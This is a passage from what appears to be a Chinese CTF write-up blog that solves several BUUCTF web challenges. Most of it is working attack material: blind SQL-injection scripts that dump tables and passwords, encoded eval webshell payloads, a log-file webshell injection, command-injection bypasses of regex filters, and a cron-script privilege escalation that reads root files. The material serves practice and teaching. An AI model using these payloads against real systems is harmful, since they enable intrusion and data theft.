，然后尝试的打开root目录，发现权限不够</p><p>打开这个标红的auto.sh，发现他60秒运行一次makeflaghint.py的脚本，makeflaghint.py有权限修改，添加<code>os.system(&quot;cat /root/flag &gt; /1.txt&quot;)</code>,过一分钟后即可得flag     </p><h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p>smarty模板注入<br><img src="../../images/ctf/buuctf/23.jpg" alt=""><br><img src="../../images/ctf/buuctf/24.jpg" alt=""></p><h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">PHP mt_rand安全杂谈及应用场景详解</a><br>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">iNoUoNVRYN</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>构造取反连接蚁剑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'assert'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a).<span class="string">"\n"</span>;</span><br><span class="line">$b=<span class="string">'(eval($_POST[y]))'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$b).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">#%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">#%D7%9A%89%9E%93%D7%A0%AF%B0%AC%AB%A4%86%A2%D6%D6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%86%A2%D6%D6);</span><br><span class="line">密码：y</span><br></pre></td></tr></table></figure><p>看到根目录下存在flag和readflag文件.应该是通过执行readflag来读取flag，但是这里的shell命令基本上都被禁了。可以通过蚁剑的绕过disable_functions来执行<br>这里选择PHP_GC_UAF<br><img src="../../images/ctf/buuctf/25.jpg" alt=""></p><h1 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h1><p>输入1 成绩100<br>输入2 成绩666<br>输入2-1 成绩100     </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url= <span class="string">'http://763ada9b-220d-4dcb-b0e5-2f4a21bd2544.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line">database =<span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"?stunum=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span> <span class="comment">#库名为ctf</span></span><br><span class="line">payload2 = <span class="string">"?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span><span class="comment">#表名为flag,score</span></span><br><span class="line">payload3 =<span class="string">"?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span> <span class="comment">#列名为flag,value</span></span><br><span class="line">payload4 = <span class="string">"?stunum=(ascii(substr((select(group_concat(value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;)"</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>,<span class="number">10000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid =(low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        <span class="comment"># payload = payload1.format(i,mid)  #查库名</span></span><br><span class="line">        <span class="comment"># payload = payload2.format(i,mid)  #查表名</span></span><br><span class="line">        <span class="comment"># payload = payload3.format(i,mid)  #查列名</span></span><br><span class="line">        payload = payload4.format(i,mid) <span class="comment">#查flag</span></span><br><span class="line">        new_url = url + payload</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">       <span class="comment"># print(new_url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hi admin"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database +=chr(mid)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure><h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br><span class="line">``` </span><br><span class="line">[利用PHP的字符串解析特性Bypass](https:<span class="comment">//www.freebuf.com/articles/web/213359.html)  </span></span><br><span class="line">PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</span><br><span class="line">```bash</span><br><span class="line"><span class="number">1.</span>删除空白符</span><br><span class="line"><span class="number">2.</span>将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure><p>可以用%20代替下划线从而绕过第一个if<br>第二个if中正则匹配表示匹配字符窜的开头和结尾<br>由于在字符窜中换行可以表示字符窜的结尾，所以可以用%0a(换行符的url编码)绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333a</span><br></pre></td></tr></table></figure><p>访问secrettw.php    </p><p>解码jsfuck，得到alert(“post me Merak”<br>post Merak 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反写chnage</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span><span class="params">($v)</span></span>&#123; </span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$real_flag = unchange(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode($real_flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span><br><span class="line"></span><br><span class="line">http头</span><br><span class="line">Client-ip : 127.0.0.1</span><br></pre></td></tr></table></figure><h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><p>用题目提供的用户密码cookie / monster 登陆，查看cookie，将username修改为admin</p><h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>访问robots.txt，得知有bak备份<br>image.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>addslashes()函数，这个函数会把特殊的字符转义。</p><p>比如:单引号会被转义成&#39;,斜杠会转义为\.</p><p>第十行的str_replace会把”\0”,”%00”,”\‘“,”‘“中的任意一个替换成空。</p><p>我们可根据这个绕过当传入id=\0时，就会在 查询语句处改变sql语句。</p><p>即:select * from images where id=’ &#39; or path=’+{$path}’</p><p>所以我们可以在path处注入我们的新语句，</p><p>由于没有查询结果回显，所以此处是盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://18d42f36-2704-43a9-8690-b52a3c0a95e8.node3.buuoj.cn/image.php?id=\\0&amp;path=or 1="</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">last=<span class="string">"tmp"</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>( last != result ):</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">head=<span class="number">32</span></span><br><span class="line">tail=<span class="number">127</span></span><br><span class="line"><span class="keyword">while</span> head &lt; tail :</span><br><span class="line">mid = ( head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">#payload = "if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))&gt;%d,1,-1)%%23"%(i,mid)</span></span><br><span class="line"><span class="comment">#payload = "if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))&gt;%d,1,-1)%%23"%(i,mid)</span></span><br><span class="line">payload = <span class="string">"if(ascii(substr((select group_concat(password) from users),%d,1))&gt;%d,1,-1)%%23"</span>%(i,mid)</span><br><span class="line"><span class="comment">#print(url+payload)</span></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b"JFIF"</span> <span class="keyword">in</span> r.content :</span><br><span class="line">head = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tail = mid</span><br><span class="line">            </span><br><span class="line">last = result</span><br><span class="line"><span class="keyword">if</span> chr(head)!=<span class="string">' '</span> :</span><br><span class="line">result += chr(head)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>这里会将文件名和用户名写入日志文件。但是这里日志文件为php格式，考虑写入shell。由于用户名只能为admin无法利用，考虑文件名注入。文件名进行了php/i过滤，可以使用短标签绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"&lt;?=@eval(<span class="variable">$_POST</span>['a']);?&gt;"</span></span><br></pre></td></tr></table></figure><p>这个文件名，会被写入日志文件中去，然后用菜刀连接。</p><h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>json属性字段一定要用双引号括起来，单引号是不可以的。      <a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">https://xz.aliyun.com/t/5399</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是他用的是preg_match()函数，只匹配一行，用个换行符搞定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A<span class="string">"cmd"</span>: <span class="string">"ls /"</span>%0A&#125;</span><br></pre></td></tr></table></figure><p>并没有flag</p><p>在这里插入图片描述<br>这里提供了路径，暂时明白为啥可以ls了，因为ls的二进制文件放在这个目录下了</p><p>看看这个路径都有啥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A<span class="string">"cmd"</span>: <span class="string">"ls /home/rceservice"</span>%0A&#125;</span><br></pre></td></tr></table></figure><p>发现flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A<span class="string">"cmd"</span>:<span class="string">"/bin/cat%20/home/rceservice/flag"</span>%0A&#125;</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h1><p>查看源码，提示 ?secret,访问得一些 ip 信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:0a:dd:75:09  </span><br><span class="line">          inet addr:10.221.117.9  Bcast:10.221.117.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class="line">          RX packets:138 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:137 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:29124 (29.1 KB)  TX bytes:29110 (29.1 KB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 02:42:ac:12:00:3b  </span><br><span class="line">          inet addr:172.18.0.59  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:85 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:27 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:21931 (21.9 KB)  TX bytes:1640 (1.6 KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:34 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:34 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 